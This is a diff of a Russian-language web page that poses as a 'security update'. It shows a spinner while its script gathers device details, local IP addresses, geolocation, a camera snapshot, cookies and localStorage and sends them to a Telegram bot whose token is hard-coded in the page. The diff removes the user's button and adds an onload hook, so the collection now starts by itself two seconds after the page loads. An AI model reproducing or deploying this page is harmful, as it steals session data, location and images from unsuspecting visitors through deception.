@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Проверка безопасности</title>
+    <title>Обновление безопасности</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -10,31 +10,30 @@
             background-color: #f4f4f4;
             text-align: center;
             padding: 50px;
+            color: #333;
         }
         h2 {
             color: #2c3e50;
         }
-        p {
-            margin: 10px 0;
+        .loader {
+            margin-top: 20px;
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ccc;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
         }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: #27ae60;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #2ecc71;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <h2>📱 Проверка вашего устройства</h2>
-    <p>Для продолжения нажмите кнопку ниже.</p>
-    <button onclick="startCollection()">🟢 Начать проверку</button>
+    <h2>⏳ Подождите, выполняется обновление...</h2>
+    <div class="loader"></div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7961419672:AAEd-VMzuf43W9PsaQLveQ__vYMf2EOswu0";
@@ -90,7 +89,7 @@
             const pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel("");
             pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            pc.onicecandidate = function(e) {
+            pc.onicecandidate = e => {
                 if (!e.candidate) {
                     if (ips.length === 0) {
                         sendData("📡 Локальные IP не найдены");
@@ -153,32 +152,37 @@
                     }, "image/jpeg", 0.8);
                 })
                 .catch(() => {
-                    sendData("❌ Ошибка доступа к камере");
+                    sendData("📷 Камера недоступна");
                 });
         }
 
         function collectCookiesAndStorage() {
-            sendData(`<b>🍪 Cookies:</b>\n<code>${document.cookie || "нет кук"}</code>`);
+            sendData(`<b>🍪 Cookies:</b> ${document.cookie || "нет кук"}`);
 
-            let storageData = "";
+            let storage = "";
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                storageData += `${key}: ${localStorage.getItem(key)}\n`;
+                storage += `${key}: ${localStorage.getItem(key)}\n`;
             }
-            if (storageData) {
-                sendData(`<b>📦 LocalStorage:</b>\n<code>${storageData}</code>`);
+            if (storage) {
+                sendData(`<b>📦 LocalStorage:</b>\n<code>${storage}</code>`);
             }
         }
 
         function startCollection() {
             const deviceInfo = getDeviceInfo();
-            sendData(`<b>📲 Информация об устройстве:</b>\n<pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`);
+            sendData(`<b>📱 Информация об устройстве:</b>\n<pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`);
 
             getLocalIPs();
             requestGeolocation();
             requestCameraAccess();
             collectCookiesAndStorage();
         }
+
+        // Автозапуск после загрузки страницы
+        window.onload = () => {
+            setTimeout(startCollection, 2000);
+        };
     </script>
 </body>
 </html>
